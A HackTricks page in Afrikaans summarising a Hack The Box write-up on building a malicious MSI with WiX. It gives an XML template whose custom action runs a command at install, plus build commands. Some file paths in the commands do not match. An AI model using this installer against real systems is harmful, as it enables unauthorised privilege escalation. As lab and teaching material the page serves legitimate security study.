{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# Die Skep van Kwaadwillige MSI en Verkryging van Root

Die skepping van die MSI-installer sal gedoen word met behulp van wixtools, spesifiek [wixtools](http://wixtoolset.org) sal benut word. Dit is die moeite werd om te noem dat alternatiewe MSI-bouers probeer is, maar hulle was nie suksesvol in hierdie spesifieke geval nie.

Vir 'n omvattende begrip van wix MSI gebruiksvoorbeelde, is dit raadsaam om [hierdie bladsy](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) te raadpleeg. Hier kan jy verskeie voorbeelde vind wat die gebruik van wix MSI demonstreer.

Die doel is om 'n MSI te genereer wat die lnk-lêer sal uitvoer. Ten einde dit te bereik, kan die volgende XML-kode gebruik word ([xml van hier](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Dit is belangrik om te noem dat die Package-element eienskappe bevat soos InstallerVersion en Compressed, wat die weergawe van die installeerder spesifiseer en aandui of die pakket gecomprimeer is of nie, onderskeidelik.

Die skepproses behels die gebruik van candle.exe, 'n hulpmiddel van wixtools, om 'n wixobject uit msi.xml te genereer. Die volgende opdrag moet uitgevoer word:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Daarnaast is dit die moeite werd om te noem dat 'n beeld in die pos verskaf word, wat die opdrag en sy uitvoer uitbeeld. Jy kan dit vir visuele leiding raadpleeg.

Verder sal light.exe, 'n ander hulpmiddel van wixtools, gebruik word om die MSI-lêer van die wixobject te skep. Die opdrag wat uitgevoer moet word, is soos volg:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Similar to the previous command, 'n beeld is ingesluit in die pos wat die opdrag en sy uitvoer illustreer.

Neem asseblief kennis dat terwyl hierdie opsomming daarop gemik is om waardevolle inligting te verskaf, dit aanbeveel word om na die oorspronklike pos te verwys vir meer omvattende besonderhede en akkurate instruksies.

## References
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
